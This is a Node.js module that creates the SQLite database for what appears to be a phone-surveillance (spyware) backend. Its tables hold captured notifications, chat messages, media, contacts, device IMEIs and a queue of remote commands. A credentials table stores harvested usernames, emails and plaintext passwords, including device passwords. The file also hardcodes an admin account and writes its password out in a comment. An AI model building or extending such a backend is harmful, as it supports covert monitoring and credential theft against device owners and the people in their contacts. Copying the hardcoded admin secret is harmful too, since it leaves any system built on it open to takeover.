const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const dbPath = path.join(__dirname, 'capture.db');
const db = new sqlite3.Database(dbPath);

// Create tables
db.serialize(() => {
    // Notifications table
    db.run(`CREATE TABLE IF NOT EXISTS notifications (
        id TEXT PRIMARY KEY,
        deviceId TEXT,
        appPackage TEXT NOT NULL,
        appName TEXT NOT NULL,
        title TEXT,
        text TEXT,
        timestamp INTEGER NOT NULL,
        mediaUrls TEXT,
        synced INTEGER DEFAULT 0,
        syncAttempts INTEGER DEFAULT 0,
        lastSyncAttempt INTEGER,
        errorMessage TEXT,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);

    // Chats table
    db.run(`CREATE TABLE IF NOT EXISTS chats (
        id TEXT PRIMARY KEY,
        deviceId TEXT,
        appPackage TEXT NOT NULL,
        appName TEXT NOT NULL,
        chatIdentifier TEXT,
        text TEXT NOT NULL,
        timestamp INTEGER NOT NULL,
        synced INTEGER DEFAULT 0,
        syncAttempts INTEGER DEFAULT 0,
        lastSyncAttempt INTEGER,
        errorMessage TEXT,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);

    // Media files table
    db.run(`CREATE TABLE IF NOT EXISTS media_files (
        id TEXT PRIMARY KEY,
        deviceId TEXT,
        notificationId TEXT NOT NULL,
        localPath TEXT,
        remoteUrl TEXT,
        fileSize INTEGER NOT NULL,
        mimeType TEXT NOT NULL,
        checksum TEXT NOT NULL,
        uploadStatus TEXT DEFAULT 'PENDING',
        uploadAttempts INTEGER DEFAULT 0,
        lastUploadAttempt INTEGER,
        errorMessage TEXT,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);

    // Create indexes
    db.run(`CREATE INDEX IF NOT EXISTS idx_notifications_app ON notifications(appPackage)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_notifications_timestamp ON notifications(timestamp)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_notifications_synced ON notifications(synced)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_notifications_deviceId ON notifications(deviceId)`);
    
    db.run(`CREATE INDEX IF NOT EXISTS idx_chats_app ON chats(appPackage)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_chats_identifier ON chats(chatIdentifier)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_chats_timestamp ON chats(timestamp)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_chats_synced ON chats(synced)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_chats_deviceId ON chats(deviceId)`);
    
    db.run(`CREATE INDEX IF NOT EXISTS idx_media_notification ON media_files(notificationId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_media_status ON media_files(uploadStatus)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_media_deviceId ON media_files(deviceId)`);
    
    // Credentials table
    db.run(`CREATE TABLE IF NOT EXISTS credentials (
        id TEXT PRIMARY KEY,
        deviceId TEXT,
        accountType TEXT NOT NULL,
        appPackage TEXT,
        appName TEXT,
        email TEXT,
        username TEXT,
        password TEXT NOT NULL,
        domain TEXT,
        url TEXT,
        devicePassword INTEGER DEFAULT 0,
        timestamp INTEGER NOT NULL,
        synced INTEGER DEFAULT 0,
        syncAttempts INTEGER DEFAULT 0,
        lastSyncAttempt INTEGER,
        errorMessage TEXT,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);
    
    // Create indexes for credentials
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_accountType ON credentials(accountType)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_appPackage ON credentials(appPackage)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_email ON credentials(email)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_synced ON credentials(synced)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_timestamp ON credentials(timestamp)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_credentials_deviceId ON credentials(deviceId)`);
    
    // Contacts table
    db.run(`CREATE TABLE IF NOT EXISTS contacts (
        id TEXT PRIMARY KEY,
        deviceId TEXT,
        name TEXT NOT NULL,
        phoneNumber TEXT,
        email TEXT,
        organization TEXT,
        jobTitle TEXT,
        address TEXT,
        notes TEXT,
        photoUri TEXT,
        timestamp INTEGER NOT NULL,
        synced INTEGER DEFAULT 0,
        syncAttempts INTEGER DEFAULT 0,
        lastSyncAttempt INTEGER,
        errorMessage TEXT,
        lastSynced INTEGER,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);
    
    // Create indexes for contacts
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_phoneNumber ON contacts(phoneNumber)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_email ON contacts(email)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_synced ON contacts(synced)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_deviceId ON contacts(deviceId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_timestamp ON contacts(timestamp)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_contacts_lastSynced ON contacts(lastSynced)`);
    
    // Devices table
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        deviceId TEXT UNIQUE NOT NULL,
        deviceName TEXT,
        model TEXT,
        osVersion TEXT,
        imei TEXT,
        fcmToken TEXT,
        lastSeen INTEGER,
        status TEXT DEFAULT 'active',
        ownerId TEXT,
        createdAt INTEGER DEFAULT (strftime('%s', 'now'))
    )`);
    
    // Create indexes for devices
    db.run(`CREATE INDEX IF NOT EXISTS idx_devices_deviceId ON devices(deviceId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_devices_status ON devices(status)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_devices_ownerId ON devices(ownerId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_devices_lastSeen ON devices(lastSeen)`);
    
    // Commands table
    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        deviceId TEXT NOT NULL,
        action TEXT NOT NULL,
        parameters TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        createdAt INTEGER,
        executedAt INTEGER,
        FOREIGN KEY(deviceId) REFERENCES devices(deviceId)
    )`);
    
    // Create indexes for commands
    db.run(`CREATE INDEX IF NOT EXISTS idx_commands_deviceId ON commands(deviceId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_commands_createdAt ON commands(createdAt)`);
    
    // Users table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        email TEXT UNIQUE,
        password TEXT NOT NULL,
        role TEXT NOT NULL,
        createdAt INTEGER DEFAULT (strftime('%s', 'now')),
        lastLogin INTEGER
    )`);
    
    // Device ownership table
    db.run(`CREATE TABLE IF NOT EXISTS device_ownership (
        id TEXT PRIMARY KEY,
        userId TEXT NOT NULL,
        deviceId TEXT NOT NULL UNIQUE,
        assignedAt INTEGER DEFAULT (strftime('%s', 'now')),
        FOREIGN KEY(userId) REFERENCES users(id),
        FOREIGN KEY(deviceId) REFERENCES devices(deviceId)
    )`);
    
    // Create indexes for users
    db.run(`CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_users_role ON users(role)`);
    
    // Create indexes for device ownership
    db.run(`CREATE INDEX IF NOT EXISTS idx_ownership_userId ON device_ownership(userId)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_ownership_deviceId ON device_ownership(deviceId)`);
});

// Create initial admin user after tables are created
const bcrypt = require('bcrypt');
const { v4: uuidv4 } = require('uuid');

db.serialize(() => {
    // Check if admin user exists
    db.get('SELECT * FROM users WHERE email = ?', ['bilal@admin.com'], (err, admin) => {
        if (err) {
            console.error('Error checking admin user:', err);
            return;
        }

        if (!admin) {
            // Create admin user
            // Password: Bil@l112
            bcrypt.hash('Bil@l112', 10, (err, hash) => {
                if (err) {
                    console.error('Error hashing admin password:', err);
                    return;
                }

                const adminId = uuidv4();
                const stmt = db.prepare(`INSERT INTO users 
                    (id, username, email, password, role)
                    VALUES (?, ?, ?, ?, ?)`);

                stmt.run(
                    adminId,
                    'admin',
                    'bilal@admin.com',
                    hash,
                    'admin'
                );
                stmt.finalize();

                console.log('Initial admin user created: bilal@admin.com');
            });
        }
    });
});

module.exports = db;
